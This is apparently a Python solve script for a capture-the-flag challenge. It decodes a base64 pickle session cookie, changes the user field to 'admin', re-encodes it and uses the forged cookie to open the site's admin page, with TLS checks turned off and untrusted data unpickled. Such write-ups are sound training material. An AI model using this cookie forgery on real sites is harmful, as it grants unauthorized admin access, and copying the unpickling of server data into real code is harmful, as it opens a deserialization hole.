#!/usr/bin/env python

import requests
import pickle
from base64 import b64decode, b64encode
import os

URL = 'https://spotted-quoll.ctfcompetition.com/'

def main():
	#FIRST VISIT--------------------------------------
	r = requests.get(URL, verify=False)
	if r.status_code != 200:
		print('Failed: %d' % r.status_code)
		return
	# print the text
	print('HTML:\n%s' % r.text)


	#GET COOKIE----------------------------------------
	r = requests.get(URL + 'getCookie', verify=False)
	if r.status_code != 200:
		print('Failed: %d' % r.status_code)
		return
	# print the cookies
	cookie = r.cookies
	print('Cookies:\n%s\n' % cookie)


	#MODIFY COOKIE-------------------------------------
	#Decode the base64 pickle
	pickb64 = cookie['obsoletePickle']
	pick = b64decode(pickb64)
	
	#Write the pickle to a tmp file
	tmpf = 'tmp.p'
	f = open(tmpf, 'wb')
	f.write(pick)
	f.close()
	
	#load the pickle
	obsoletePickle = pickle.load(open('tmp.p', 'rb'))
	print('Real Pickle:\n%s\n' % str(obsoletePickle))

	#We are logged out
	#let's trick the site into thinking we are logged in as admin
	obsoletePickle['user'] = 'admin'
	print('Spoofed Admin Pickle:\n%s\n' % str(obsoletePickle))

	#Write to spoofed pickle to a new file
	pickle.dump(obsoletePickle, open('spoofed.p', 'wb'))
	spooff = 'spoofed.p'
	f = open(spooff, 'rb')
	pick = f.read()
	f.close()

	#Encode the admin pickle in base64
	spoofed_cookie = dict(obsoletePickle=b64encode(pick))

	#login to admin page
	r = requests.get(URL + 'admin', verify=False, cookies=spoofed_cookie)
	print(r.text)

	#delete tmp pickle files
	os.remove(tmpf)
	os.remove(spooff)


if __name__ == "__main__":
	main()
